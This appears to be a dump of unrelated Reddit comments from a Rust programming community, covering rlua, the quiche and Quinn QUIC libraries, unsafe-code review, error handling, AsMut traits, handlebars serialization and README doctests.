This is a good example, but just as an FYI, this is not using rlua 0.16 and is missing the Lua::context calls that you would need for 0.16+. This is completely understandable because 0.16 was only released a few days ago! This “context” system was an unfortunate but necessary large API incompatible change in 0.16 (it fixes a soundness issue), so sorry for any confusion it causes.
I could stand to put more examples of this in the documentation for rlua, but this is definitely something you can do. I’m on mobile right now so I can’t really give a great example, but there’s one *tiny* example of this in the guided tour: https://github.com/kyren/rlua/blob/acb61b720ac69965bb4df6afad556a681486c152/examples/guided_tour.rs#L97 The reason there are not many examples of this is that functions are not even special, in every way that you can manage Lua *values* you can manage Lua functions, because functions are one of the basic Lua values. In that example in the guided tour, the string key is a constant string, but it can be anything (anything!) that implements ToLua, so you can definitely use a dynamic string here, or drill down several tables like in magmaCube’s example. You can do more than that, though, you can return functions to Rust from other Lua functions, if you need to keep long term references to Lua functions you can put them in the registry, you can do with them whatever you want, because they’re just values. I would give you a more full example but like I said I’m on mobile right now, but if you have any other questions about how to do this or about rlua in general feel free to ask!
Gist? It'd be great to pick up where you left off.
I hear you what saying, and I've sometimes contemplated doing just that, but then there are few points why I haven't committed: * time * copyright/IP * I'm a noob Rustacean and my code is amateur hour. * making it generic means adding adding more features (to cover more potential use cases), which ironically ends up with far more complexity then if you just "copy pasted and edited" or CPEDD (copy paste edit driven development) I kid :) * other reason I've forgotten now
There's a lot of unsafe usage in their library. With lots of .unwrap() used inside the unsafe blocks. 
Ah. Got it!
For your specific question about "which are more expensive than others", uncheck all the lint groups except "perf".
Is this a competing library with Quinn 0.2.0, which was just announced yesterday?
I'm continuing work on Arbalest, I'm thinking of writing the single-threaded version of the types and adding an `Unique&lt;T&gt;` which cannot be cloned and which implements `DerefMut&lt;Target=T&gt;`. I'm thinking about adding a third refcount to the inner struct too, to support owning references that don't allow access to the data. That type would allow to emulate the same kind of use cases as `Arc&lt;AtomicRefCell&lt;T&gt;&gt;`.
Two QUIC protocol project announcements in one week?
Yikes. I'm not too surprised they'd have unsafe in context of the FFI stuff (that's where almost all of the occurrences are), but it's a little strange to have so many instances of unsafe code in the `ring` library when you could imagine almost all of that could be pure rust.
&gt; The application is responsible for fetching data from the network (e.g. via sockets), passing it to quiche, and sending the data that quiche generates back into the network. The application also needs to handle timers, with quiche telling it when to wake-up (this is required for retransmitting lost packets once the corresponding retransmission timeouts expire for example). This leaves the application free to decide how to best implement the I/O and event loop support, depending on the support offered by the operating system or the networking framework used. On the one hand it's great you get such low level control. On the other it feels like this should be handled lower in the stack. You don't normally have to control TCP's window size or manually send ack packets for instance. Is this just reinventing the wheel?
Ring is a slow, steady port of a C + asm codebase.
Ah that explains a lot of things.
I'd like to work on it but I might hit legal issues because I work at a company that does similar things.
I would be interested in knowing if anyone does contact work in Rust in those groups; I thought about asking on the Slack but felt it would be intrusive to outreach through a software translator. :/
`src/ffi.rs` and `src/tls.rs` make up the vast majority. Briefly skimming that, it looks like fairly standard Rust ffi stuff. Nothing sticks out at me. (Again, on a quick skim.) After that, there's 7 uses of unsafe. `src/rand.rs` is an ffi call. `examples/client.rs` looks like it's just a leftover debugging println? If not, that should definitely switch to `str::from_utf8(&amp;data).unwrap()` (or handle the error, but it is an example). `src/crypto.rs` appears to have been recently updated to remove its 2 uses of `unsafe`. (They otherwise look like fairly standard uses of `uninitialized`; just unnecessary in this case.) The first two uses of `unsafe` in `src/octets.rs` almost looks like a reimplementation of `byteorder`. It appears correct though. The third use of `unsafe` in `src/octets.rs` looks like a re-implementation of `copy_from_slice` I think? So this doesn't look that bad to me. Vast majority is ffi. Looks like a couple instances could be replaced with safe code.
Thanks for the review. I'm still learning Rust.
Specially, boringSSL, hence the name.
Yeah, since I posted a link, I thought I polish it a little; Upgraded dependencies and converted it to Rust edition 2018. If you have the option to update your compiler via \`rustup update\`, the new commits should compile just fine. Your problems sounds like a driver issue to me. That's just a guess, though.
No -- notice that's in the Appendix, "How to apply the Apache License to your work", explaining that you should "attach the following boilerplate notice, with the fields enclosed by brackets "\[\]" replaced with your own identifying information". It's example text included in the license. You don't change that part. Neither Rust nor ryu uses that example text, because they're both dual-licensed and use their own text in a comment at the top of each file.
I need some of the Adams-Bashforth methods, which are not available under those packages. I am also not interested in implementations which haven't been "battle-tested" to some degree, as correctness matters. In other words, I do not want to write my own code. While Rust certainly keeps one safe from memory errors, it does not keep one safe from other sorts errors (e.g. typos: having an inequality in the wrong direction, or a + where there should be a -). Thus, I would be more inclined to use code which has a large contributor base, as that is likely to mean it is better tested. In any case, I am not sure I would consider your "solution" to be a solution, since you are attempting to address the "root cause", which I did not clearly identify (but I did make the mistake of hinting at it, so I get where you're coming from). I suppose what I am trying to say is: what if I was just interested in interfacing Rust -&gt; Julia, for no other reason than fun? 
This is very promising!
Yes, I suppose so. Let me look into it.
Is there a way to access location information any time soon? I really wanted to use `proc-macro2` in my snapshot testing library but sadly I cannot tell on which line and column a macro is due to that api hidden behind a cfg flag.
What do you want to achieve? Don't optimise yet. Use Unix pipes if possible.
&gt; For very simplistic things at that, like simple process handling that would be better done through any number of abstractions. Not that I've noticed. We already have `std::process::Command` and higher level crates like `subprocess` over that. Who is using fork for handling processes? I know that the Ion system shell for Redox / Linux / Mac OS is using fork, but that's a given considering that the shell is using it to do some interesting techniques, such as interchangeably pipelining shell functions with external commands, or subprocess expansions. That way script writers can utilize an Ion function or builtin command as if they were external commands. &gt; Our overly heavy focus on simplistic CLI stuff as a community is very strange IMO The overall Rust community today is mostly focusing around CLI applications and system services, in addition to web frameworks and web projects, because that's what's tangible to create until there's a decent cross-platform GUI framework to work with. Personally, I've seen more fascination with the web from the Rust team than anything else. Desktop and OS development has been very low priority, with most of the focus being in favor of web-related projects, such as async I/O with futures. To no surprise, all of the examples you'll find about futures are exclusively centered around designing web services. Redox has had a hard time getting some fixes integrated upstream as a result. A fork of Rust's standard library has to be kept around while we wait for feedback and to get PRs merged. There still aren't good solutions for setting up signal handling/masking, job control, and more advanced process management. Have to interface with system calls directly for that. The development of GUI frameworks and other OS architectures are being driven by Redox, today. Everyone that's been interested in having an OS written in Rust has already gravitated towards Redox to combine their efforts. We have the equivalent of 'working groups' for the various aspects of the desktop. Contributors are free to join whichever groups they're interested in. If you're a Linux-focused developer, then GTK application development with Rust is already perfect, and has been for the last two years. That's merely a factor of GTK being written in C and having tools to automate binding generation. Also having support from GNOME helps too. Seems many of the newer GNOME projects are written in Rust. At System76, I write GTK GUI applications in Rust as well. Rust is pretty good at it once you combine it with the cascade macro. &gt; and not especially helpful in the grand scheme of anything. I really don't see how. Whether you're building a GUI or CLI application, you still need to develop the crates that implement the functionality that your application requires. Translating a CLI application to a GUI is actually pretty simple. Whether there's a focus on CLI or not, the Crates ecosystem is still gaining more functionality at a steady pace.
The problem is basically that tcp has rusted shut at this point. Reimplementing it over udp and hiding as much as possible from middleware seems like the way to go to prevent this from happening again. Its absolutely reinventing the wheel, but with many improvements Its an unfortunate but pragmatic solution
It would need to use nss I think
&gt; I am also not interested in implementations which haven't been "battle-tested" to some degree, as correctness matters in my use case. Maybe automatic testing against the original library, would give you enough confidence. Generate data-set, run against both Julia and Rust impl, see if result is the same. Potentially with fuzzing employed.
I briefly read someone's AoC solution that seemed to pair a struct with RegEx. Like you could specify how to extract the fields using a syntax similar to ##[derive Does anybody know of anything similar?
As someone eyeballing a crate which seems to be unmaintained, I'm also interested in knowing what happens in this scenario.
Oh definitely, and that's a good example. If it wasn't clear, my point isn't that variadic generics might not be useful for some things, but that I don't think variadic functions are really needed, since macros can largely do the same thing (though maybe if that were implemented well, it could have some advantages over macros, like better error messages).
Once I've graduated from University, I'll come back to reread this entire blog. PL has to be my favorite section of computer science, but I understand way too little of it.
It's okay if you speak in English. A lot of us understand it. It's just that "a place to talk about Rust in Korean" is the primary value proposition of these venues. Feel free to ask in English in a quiet period. Please refrain from doing so when active Korean discussion is in progress. Thanks!
I'm having a tough time using errors succinctly. I'm currently trying to just parse a toml file using \[toml\]([https://crates.io/crates/toml](https://crates.io/crates/toml)). What I'd like to write is this: ```rust fn from_file(path: &amp;Path) -&gt; Result&lt;Dotfile,Box&lt;dyn Error&gt;&gt; { let mut data = String::new(); fs::File::open(path)?.read_to_string(&amp;mut data); toml::from_str(&amp;data) } ``` This is what the book suggests, but unfortunately it seems that non-standard errors don't quite implement everything they need to for this, and as such the `toml::from_str(&amp;data)` call can return errors I don't handle and I get: ``` error[E0308]: mismatched types --&gt; src/config.rs:56:9 | 53 | fn from_file(path: &amp;Path) -&gt; Result&lt;Dotfile,Box&lt;dyn Error&gt;&gt; { | ------------------------------ expected `std::result::Result&lt;config::Dotfile, std::boxed::Box&lt;(dyn std::error::Error + 'static)&gt;&gt;` because of return type ... 56 | toml::from_str(&amp;data) | ^^^^^^^^^^^^^^^^^^^^^ expected struct `std::boxed::Box`, found struct `config::toml::de::Error` | = note: expected type `std::result::Result&lt;config::Dotfile, std::boxed::Box&lt;(dyn std::error::Error + 'static)&gt;&gt;` found type `std::result::Result&lt;_, config::toml::de::Error&gt;` ``` Now, as a workaround I can define a custom error type that takes the e.description() and then just return that, but that seems needlessly verbose, and actually removes some of the usefulness of these errors. How do I do this "properly"?
Question about *struct update syntax*: let user1 = User { email: String::from("someone@example.com"), username: String::from("someusername123"), active: true, sign_in_count: 1, }; let user2 = User { email: String::from("another@example.com"), username: String::from("anotherusername567"), ..user1 }; This is from the Rust Book, but the question it doesn't seem to answer is how this syntax ties in with ownership rules. In this particular example, we're only getting simple scalar types (a `bool` and a `u64`) from `user1` when creating `user2`, but what if we were, say, also taking `email`? Would `user2` take ownership of `user1`'s `String`? Or would it get a clone? And if the latter, would we therefore get a compiler error if we tried to do this with a data type that didn't implement `Copy`?
What does const-generics do to you that `typenum` can't?
I haven't tested it, but from the `syn` docs it seems that type implements `Debug`. Depending on what kind of "pretty-printing" you want, that might work, with the help of a neat formatting option you may not be familiar with: &gt; Debug implementations using either derive or the debug builder API on Formatter support pretty printing using the alternate flag: {:#?}. —https://doc.rust-lang.org/std/fmt/trait.Debug.html
I know that the TCP and UDP protocols are implemented in the Linux Kernel, so my question is: "is quic more likely to be adopted if there is a module for it?" I'm hesitant to assume yes because it rides over UDP, but is it more efficient to implement it in kernel land or userspace? I've heard context switching is horrible for performance.
`user1` is (partially) moved as a result; if you took `email`, it'd be moved from `user1` into `user2`. (I say partially because any `Copy`able fields on `user1` and any non-moved fields (things overridden in the update) are still available on the object, but you can't call anything that uses the object itself.
\*ring\*
Quinn has been under development for a while now. Quiche is brand new.
Meanwhile, mio still works great, no error type towers, simple to grok, better control over allocations, doesn't need special syntax ...
Actually, one of the reasons this was developed (as I understand it) was specifically so that it could be offered in user space without needing to wait for all OSes to adopt it before it could be widely used. Maybe there is more kernel to userspace in the case of duplicate packets, but if the connection is decent, it probably shouldn’t be that much worse (than if it were in the kernel).
Your code works if you replace the last line with: ``` Ok(toml::from_str(&amp;data)?) ```
One possibility is to implement an `Iterator` that encapsulates the skipping of records, allowing the user to simply iterate over non-skipped records. 
As a new rust user I'm finding the whole macro situation totally opaque. There's macro rules, macros 2.0, proc macros, procmacro2 and who knows what else and I've lost the plot. &amp;#x200B; I thought Rust macros were inspired by scheme macros, and scheme's system is simple and lets you run arbitrary code, so why is rust so complicated?
Is this Cloudflare's first public Rust project? I know they've stated they use it publicly, but I don't recall a specific project being announced.
Where does he say it in the talk? Don't want to watch the whole thing...
Just work with macro rules first. You'll know if you need the newer kinds. The Rust book has a decent section on macro rules.
/r/playrust
You'll have to step outside the standard library. stdlib doesn't really try to do a good job with i/o because designing a good API is a bit of a hard problem. Different OS handle this stuff *very* differently. On unix-like you are probably best off using a poll/select system call (`mio` is probably the best crate) and on Windows, if I understand correctly, it's IOCP/"overlapping" asynchronous io. On Windows, `mio` seems to only know how to deal with network sockets, unfortunately. (You could also, on unix-like, use SIGALRM to interrupt the read syscall - the Rust standard library was *not* designed to play nice with signals at all, so it's not really worth considering.) Programming languages which let you set a timeout are doing something like that behind the scenes, either in their standard library or interpreter. Sadly this is one example of "low level" posing a challenge.
I'm really skeptical of that crate because the test cases all access normal files on Unix. That's very silly because normal files on unix ignore timeout requests - they are *always* ready to read or write. What about Windows? Well, the crate docs don't say it explicitly, but it uses unix-specific library calls. It should work on a unix-like os though. 
Thanks Erich! Sounds like you have some experience :-) I hope it can be a place for Rust developers in Seoul to meetup and share knowledge
You want r/PlayRust.
Only the old book. The current version doesn't even mention them! There is https://danielkeep.github.io/tlborm/book/mbe-macro-rules.html though. 
Which is probably what the Julia folk have done; why do I need to repeat their hard work?
I'm having trouble understanding the necessity of `as_mut()` here: fn add_one&lt;T: AsMut&lt;u64&gt;&gt;(num: &amp;mut T) { *num += 1; } fn main() { let mut boxed_num = Box::new(0); add_one(&amp;mut boxed_num); assert_eq!(*boxed_num, 1); } This will fail to compile with `binary assignment operation `+=` cannot be applied to type `T``. To fix it, [change the second line to `*num.as_mut() += 1;`](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2015&amp;gist=423e293f267a12156961a8b3fabe61e9). Is it because `num`, a mutable Box, doesn't dereference to a mutable reference to its *contained value*, which needs the `as_mut()` after it as a result? But, if that was the case, why doesn't fn add_one&lt;T: AsMut&lt;u64&gt;&gt;(num: &amp;mut T) { let foo = &amp;mut *num; foo += 1; } work?
That post you linked to looks like it could very likely work for your use case, but it would depend on how frequency you needed to call back and forth between Rust and Julia. If I had to make a completely uninformed guess (you should try profiling!), I would estimate that one of those calls would add on the order of milliseconds of overhead. If you only needed a few calls it would be fine, but doing millions might be a bad time.
I like the low level implementation and it is quite clear how to use it. I'm sure anyone that prefers an event-loop model will gravitate to this lib. 
A while back I started writing [safe bindings](https://github.com/pi-pi3/julia-rs), but it since died. It was somewhat functional from what I can remember, though. I'd be happy if someone took over. 
Oh :( that's unfortunate. Good catch though.
Rust/cargo statically compile in libraries by default, so making gtk-rs LGPL would cause a lot of issues. Rust doesn't have a good story for dynamic linking.
This isn't an issue with rust. I see it in lots of languages - "lightweight" and "efficient" get thrown around a lot with no real numbers.
I think the only problem is lack of data. There's only paper, and is not massively tested for corner cases and possible compatibility.
Because the type `T` "owns" the value, and when you call a function that returns the value, it can return it in one of three ways: - As an immutable reference - As a mutable reference, - It moves the value out of itself Also, since `num` is of type `T` which as far as the function is aware (based on the type constraints) contains functions defined on the trait `AsMut`, it is unaware that `T` may be capable of arithmetic operations.
Cloudflare runs a non-logging DNS, fights patent trolls and uses Rust? Please stop, I can only get so erect. 
Duplicate packets don't have any special impact on load. I have plans to get Quinn using `sendmmsg`/`recvmmsg` to keep the number of context switches low indeed, if that starts to show up in profiling.
They're not unique in that; Quinn offers a similar interface in `quinn-proto`, which the optional higher-level tokio support crate is defined in terms of.
By looking at how c++ developers are dealing with lifetime issues I understood why Rust is trying to solve these issues right away. That's all
FWIW there is a similar situation that works very differently. If you use the trait \`DerefMut\` rather than \`AsMut\` and you call some method instead of using an operator, it will automatically traverse into the interior type.
No, they're developing their own C++ client (although I asked about changing Quinn for their needs). Seems like Rust enthousiasme has not spread to that part of the organization yet. 
Post your code for *m*
Except for the (surprisingly large) tokio implementation there is no example for quinn-proto and it takes some figuring out to understand how to use it.
Yeah, I get where you're coming from and your approach is totally valid. My thinking was that the effort to have a "duplex" interface between rust and Julia might be more effort than implementing e.g. the Adams-Bashforth method, which BTW is available in boost's odeint. You could expose it to rust via the c ffi. Finally, I wouldn't overestimate how "battle-tested" a specific function within a library for a language that just hit 1.0 really is. All of this is quite niche... When implementing expm for rust I found a ca. 6 year old bug/wrong implementation in scipy. I guess it shouldn't get more battle-tested than that.
As far as add_one is concerned, the boxing is *completely irrelevant*. All it knows is that it has a value `num` of type `&amp;mut T`, and all that is known about the generic type `T` is that it implements `AsMut&lt;u64&gt;`. Nothing more, nothing less. What does that get you? Not the ability to dereference—that would require `DerefMut&lt;Target = u64&gt;` (and given that you have an `&amp;mut T` instead of a `T`, you’d then need `**num += 1;`). All it gets you is the ability to call `.as_mut()`, which will get you an `&amp;mut u64` (not an `&amp;mut &amp;mut u64`, because `as_mut` takes `&amp;mut self` and so in this case consumes the outer `&amp;mut` wrapping).
This is fantastic, thank you!
So you don't have to deal with Julia bindings?
 `pub fn m(&amp;self) -&gt; String {self.c.clone()}` Where *c* is another field in my struct which is marked serde(skip) as I don't want it serialized. 
You just answered your question. From the handlebars README: &gt;You will need to make your data Serializable on serde. We don't actually serialize data into JSON string or similar. However, we use JSON data type system in template render process. &amp;#x200B;
Wow, super cool - I had no idea that this feature was underway!
I saw the RFC PR when it was first opened then completely forgot about it. I've been thinking for a while that someone should start a publication showcasing different unstable features and updating people on their progress; I was thinking I'd do it but it's more effort than I'd like to put in right now.
Casting to `dyn Trait` only works for `Sized` types because the size and alignment are stored in the vtable — that's just how it's implemented. If `&amp;T` implements `Trait`, though, you can cast that into a `dyn Trait` - i.e. turn an `&amp;&amp;T` into an `&amp;dyn Trait`.
It's my cousin! :) &amp;#x200B; I let him know we were thinking of him.
Using rustdoc as a static site generator seems like more work than it's worth in the long run, but it seems like it's been working in this case. Any specific reasons for the design choice?
It hasn't been a documentation focus because we haven't expected anyone to want to use it; tokio is awkward sometimes, but it's highly composable and async/await is coming soon. If someone's interested in using Quinn specifically with a custom event loop, we'd love to hear from them!
I've done something similar: [https://play.rust-lang.org/?version=nightly&amp;mode=release&amp;edition=2015&amp;gist=a9b79023f22e393ae7f76222ec1ee792](https://play.rust-lang.org/?version=nightly&amp;mode=release&amp;edition=2015&amp;gist=a9b79023f22e393ae7f76222ec1ee792) I think it can be improved by using and arena and \`&amp;'a Expr\` instead of \`Rc&lt;Expr&gt;\`
I am also writing out the struct to a file and I don't want *c* serialised there. So I want *c* marked as skip. 
Ah, that makes sense. The result is rather surprising though. The workaround is a good idea; I'm guessing that if all the functions I'm interested in take `&amp;` and `&amp;mut` receivers, which they already do by design, then I can just make a private `Ext`-like trait to do what I want.
sad to hear :(
Good approach. I'm impressed. If it would be supplied with equivalent Rust code, it would be really great. 
Is this tested for all f32 values?
Wasn't there someone else posting about a faster float-to-string conversion a few weeks back? What happened to that, and how does this crate compare?
&gt; Do you know of a cheatsheet or chart somewhere that lists common Rust functions that do similar things and shows which are more expensive than others and when/why you'd want to make that trade off? Well, i don't know if such a cheat sheet exists, but if it's not listed [here](https://cheats.rs/) it probably doesn't. To be fair, it's pretty hard to write such a cheat sheet. When i'm in doubt, I use [https://godbolt.org/#](https://godbolt.org/#) and look at the generated assembly to measure how many instruction an operation takes. Generally, more instruction == worse performance (not in all case though). It's a cool idea though. Maybe someone will take the time to do such a cheat sheet.
Yeap. But having to repeat files in buildscript is unfortunate
I'm sure there is dozens of us.
Comments in the original https://www.youtube.com/watch?v=uQyT-5iWUow are quite enlightening. Ex: When C++11 hit the scene that rekindled my interest in C++ and I went and wrote a significant amount of C++11 for a special project. But even as new and cooler things are being added to C++11 to get us to C++20, videos such as this one are demoralizing my interest in staying with C++ going forward. I've now watched several Cppcon 2018 videos and nearly everyone of them was something on the perils of C++ if you don't understand it to an arcane level.
Sure, but be warned: Some optimizations lead to lines like `&amp;(self * &amp;(g * &amp;(&amp;f.d(x) * &amp;MINUS_ONE_EXPR.with(|minus_one| f.pow(minus_one))))) + &amp;(&amp;f.ln() * &amp;g.d(x))` I have hardly spent any time cleaning it up for readability [https://gist.github.com/rawler/a97acdd524f41d8e7adfd8a951138745](https://gist.github.com/rawler/a97acdd524f41d8e7adfd8a951138745)
Have you looked into the `wasm-bindgen`, `js-sys` and `web-sys` crates? You can do everything without touching JS.
@ /u/dtolnay , I've got an idea for a super easy CLI utility that I've thought might be useful for some things, but it would be a binary, rather than a library. What are your thoughts on requesting a CLI utility? I can understand requesting a very specific app would probably be out of the scope, but my idea would be easy to implement, and generally useful. 
Wow! Somebody is still paying attention to Graphplan! I did my PhD work around this kind of stuff all too many years ago. Kudos for putting this together. Maybe you should throw an encoding of a small Towers of Hanoi instance or Blocks-World instance or something up there to show the full potential of fast planning?
I agree, it would be much better, if this kind of dependency to non-Src files could be declared in Cargo.toml I would favor a config-key in Cargo.toml like rerun-if-changed=\[ "data/\*", "data/ \]
I just release a new version (0.2.0) that includes this change: [https://crates.io/crates/pickledb](https://crates.io/crates/pickledb). Thanks for the tip!
If you just want to watch a little, look at the example starting at 38:22. It returns a temporary object from a function, then calls a method of this object that returns a reference into the object. This reference is kept beyond the destruction of the temporary. No compiler warnings, because the compiler cannot know (without interprocedural analysis) that the reference returned from get_data must not outlive the object. In Rust, the get_data method would be annotated (implicit annotations do the right thing) to note that the returned reference is bound to the lifetime of the object, and so the compiler would catch the error.
I'm dropping errors because they can only occur if one of the sides dies unexpectedly, and I know that they are both still alive because they continue to spew debug traces. But you're right, I'll put some more debug code just in case.
This is quite cool and a nice demo, however for someone like me on a phone that does run the code but effectively can't edit it, it might be a lot more impressive if the optimized plan of actions wasn't in the same order as the input in the file.
&gt; The external_doc feature needs a kick in the pants to get stabilized so more people can benefit from this as well as its intended uses. 
There is a bit more info on the [home page](https://newrustacean.com/show_notes/index.html) and [this linked source](https://newrustacean.com/src/show_notes/e001.rs.html).
Lifetimes are a struggle for me, thanks
My READMEs nowadays are almost always repeats of the high-level docs in `lib.rs`, so doctests just work from the start. The README isn't even visible from locally-built docs.
It really does. It's one of the least controversial features that has yet to be stabilized, considering the RFC was merged over a year and a half ago. I think mostly because not enough people know about it.
I'm not a fan of using YAML in my projects. Due in part to its massively complex spec (a bit longer than XML's and an order of magnitude bigger than JSON or TOML) It has a history of implementations being inconsistent with each other, which is not something you want in a serialization format. Here are a couple of examples: * https://github.com/cblp/yaml-sucks * https://arp242.net/weblog/yaml_probably_not_so_great_after_all.html * https://ciaranm.wordpress.com/2009/03/01/yaml-sucks-gems-sucks-syck-sucks/
Sure, but what if you make a mistake in copying the example from the root docs to the README or forget to update it after an API change? I've run into that many times. I wouldn't mind `#[doc(include)] `-ing my README as my crate root docs if there was a way to hide stuff that belongs in the README but not necessarily in the docs, like license or contributing or Travis build status. It might be as simple as adding a class to the Rustdoc CSS that just hides its contents so you could wrap those things in a div and they'll get rendered in the README but not in the docs.
&gt; I'm not a fan of using YAML in my projects. Due in part to its massively complex spec (a bit longer than XML's and an order of magnitude bigger than JSON or TOML), it has a history of implementations being inconsistent with each other, which is not something you want in a serialization format. It's not really that relevant for this project if YAML has a spec or not, but that it serializes well diffable. The secondary serialization format is RON which has no spec at all but lets me preserve type information. There is no alternative to YAML which is currently serde compatible sadly.
Great episode, Chris! One slight correction: the latest version of Amethyst at the time of writing is 0.10, not 0.9. You should probably update your show notes to point to the [0.10.0 examples](https://github.com/amethyst/amethyst/tree/v0.9.0/examples).
These resources might be helpul for you to get started. [https://www.cybrhome.com/topic/rust-tutorials](https://www.cybrhome.com/topic/rust-tutorials)
You can use [crates.io badges](https://doc.rust-lang.org/cargo/reference/manifest.html) to declare your project as unmaintained: ``` [badges] # Maintenance: `status` is required. Available options are `actively-developed`, # `passively-maintained`, `as-is`, `experimental`, `looking-for-maintainer`, # `deprecated`, and the default `none`, which displays no badge on crates.io. maintenance = { status = "..." } ``` You might want to mention it in the README as well and consider archiving the GitHub repository.
Great! I have written down some recommendations below, please see it as encouragement more than criticism. I haven't run your project, so this is going by code style and presentation alone. If you want to show off your project, maybe give an example of its usage in the Readme. Since it's a maze solver, maybe even add some nice visualization? There are a couple of typos in the description and the code itself. For example "experiance", "infurstructure", "modals". Try to add documentation to the code as well. Even things that you think are obvious probably aren't to people new to your code, and describing it in a sentence can make a big difference. If you're writing a library, consider what should be `pub` and what shouldn't. If you make something public, why not [implement/derive](https://rust-lang-nursery.github.io/api-guidelines/interoperability.html#c-common-traits) some common traits? There are some things that can be written simpler or shorter. Sometimes this can be detected by [clippy](https://github.com/rust-lang/rust-clippy). For example, you create the function [`Node::clone(&amp;node)`](https://github.com/smarion2/RustyMazeSolver/blob/master/src/modals/wall_node.rs#L69), but you also derive `Clone`. You should be able to call `node.clone()` and get rid of this function altogether. You also cast `u8` to `u32` a lot. You could improve this by calling `u32::from()`, which will statically guarantee the validity of the code. 
Could also be hidden with a `nightly` feature. ~~~rust #![cfg_attr(feature = "nightly", feature(external_doc))] … #[cfg(feature = "external_doc")] #[doc(include = "../README.md")] #[allow(dead_code)] type DoctestReadme = (); ~~~ ~~~bash $ cargo +nightly test --features nightly ~~~
That's why I liked the old book much more than the new one - too much deep information was removed/rewritten. So, even now it won't hurt to read both versions for newcomers.
I just use old reddit
He doesn't. I misunderstood this, too. There are no quotes. :-)
enthusiasm
You'd definitely want to do that for any production crate if you don't want to require nightly exclusively. I omitted it for demonstration purposes but I did try to at least mention it in the README.
Why not
Oooh, bikeshedding! :) What would be really neat is if you could include *parts* of a file. For example, by using HTML anchors (which are not included in text rendered MD, but are included in HTML rendered MD - which is absolutely fine) as metadata for rustdoc: &lt;a name="foobar"&gt;&lt;/a&gt; ## Foobar implementation Lorum ipsum .. &lt;a name="foobar_end"&gt;&lt;/a&gt; and then #[doc(include = "../README.md#foobar")] This would be the most useful if you could intersperse `#[doc(include = "...")]` with the `//!` inner doc comments.
I've run into a situation where the borrow checker where it seems to be overly restrictive, but I want to be sure I'm not missing something. An executable example is [runnable on the playground here](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=d7dfc272186ec6108e7aa8d26383eb5d). ``` use std::collections::HashMap; struct A { data: HashMap&lt;usize, String&gt; } impl A { fn f(&amp;mut self, key: usize) -&gt; &amp;mut String { if let Some(x) = self.data.get_mut(&amp;key) { return x; } self.data.insert(key, String::new()); self.data.get_mut(&amp;key).unwrap() } } fn main() {} ```
If they are identical, then `()` comes before `await?` in the operator precedence order, which means that `await? { some_fn }()` is also identical.
Microsoft has just implemented this algorithm in their C++ standard library. /u/STL contributed some improvements in the process. 
Hey, it's definitely worth suggesting on the [tracking issue](https://github.com/rust-lang/rust/issues/44732). &gt; This would be the most useful if you could intersperse #[doc(include = "...")] with the //! inner doc comments. I think multiple doc attributes *are* concatenated so I wouldn't be surprised if this works already... if it doesn't then it probably wouldn't be difficult to *get* working.
Consider: struct MyStruct { inner: u64, } impl AsMut&lt;u64&gt; for MyStruct { fn as_mut(&amp;mut self) -&gt; &amp;mut u64 { &amp;mut self.inner } } `MyStruct` satisfies `AsMut&lt;u64&gt;` but does not implement `AddAssign`, so you can't use `+=` with it.
From what I could find, if-let is sugar for a match block. If you were to replace the if-let with a match block, you will see the you are clearly trying to have two mutable borrows at once: match self.data.get_mut(&amp;key) { Some(x) =&gt; return x, _ =&gt; { self.data.insert(key, String::new()); self.data.get_mut(&amp;key).unwrap() } }
You'll need to make a separate structure where `m` is a string field and use that as your context instead. Handlebars serializes the context structure to a `serde_json::Value` that it can look up values in. This means that Handlebars cannot call methods on the context structure (since those methods won't exist on the `Value` object) and you won't be able to refer to fields that are skipped by `serde` (because those fields won't exist in the `Value` object).
Did that, the bug still happens silently, no error in sight. *Sight*
I think at that point you just create another struct that you only use for Handlebars templating. You need different serialization behavior, and the easiest way to achieve that is to have another struct that serializes differently. Your new handlebars-specific struct could just hold references to each field in the primary struct, so you don't incur the cost of copying each field. like so: [https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=8e2b448b4bf8c5dc57fd09c7bc0d9d9e](https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=8e2b448b4bf8c5dc57fd09c7bc0d9d9e) &amp;#x200B; Should that not work, you could just forgo the references and have an identical struct, and clone everything you need into that.
maybe? ``` rust use std::collections::HashMap; use std::fmt; //#[derive(Debug)] struct Mycustomstruct { pub id: u32, pub name: String, pub marks: u8, } impl fmt::Debug for Mycustomstruct { fn fmt(&amp;self, f: &amp;mut fmt::Formatter) -&gt; fmt::Result { write!( f, "Student's name: {}; id: {}; mark: {}", self.name, self.id, self.marks ) } } fn main() { let input = vec![vec![2, 5, 3, 5]]; println!("{:?}", find_saddle_points(&amp;input)); let mut student_data: Vec&lt;Mycustomstruct&gt; = Vec::new(); let mut student_map = HashMap::new(); student_map.insert(String::from("A"), 85); student_map.insert(String::from("B"), 55); student_map.insert(String::from("C"), 67); student_map.insert(String::from("D"), 47); student_map.insert(String::from("E"), 54); student_map.insert(String::from("F"), 45); student_map.insert(String::from("G"), 35); student_map.insert(String::from("H"), 95); student_map.insert(String::from("I"), 98); student_map.insert(String::from("J"), 35); for (index, (k, v)) in student_map.into_iter().enumerate() { student_data.push(Mycustomstruct { id: index as u32 + 1u32, name: k, marks: v, }); } let _: Vec&lt;Mycustomstruct&gt; = student_data .into_iter() .filter(|student| student.marks &gt; 50) .inspect(|student| println!("{:?}", student)) .collect(); } ```
Try [Diesel](http://diesel.rs/) or [else](https://github.com/rust-unofficial/awesome-rust#database-1)
I have a little bit of it! I run the Utah Rust to meetup. :-)
Or else what?
Not in such a simple way. The structs don't contain any such information after the code has been compiled, and a macro can only access the information you give it. To iterate the fields during runtime, you would need a function that can return them, so that would have to be implemented for each individual struct (maybe via derive? ;) ). To get them during compile time, they would have to be among the macro input (that's how derive can do its thing).
You might want to try Postgres. It's probably the most popular database amongst users of Rust, and correspondingly has some of the best support. + It has the jsonb type which you can use as schemaless storage if that's what you want.
My issue with that though is the caller would have no reasonable understanding of execution time. Thousands of rows may be skipped at times, depending on the record format.
I thought Jason said it too. The title could be better.
Nice take on this problem; I've found it has a surprising demand (I did a similar thing with my own [enum\_dispatch](https://crates.io/crates/enum_dispatch) library). Interesting approach accessing the memory block directly. I'd be curious to see if this has better performance than my implementation without `unsafe`, which requires a trait implementation for each variant.
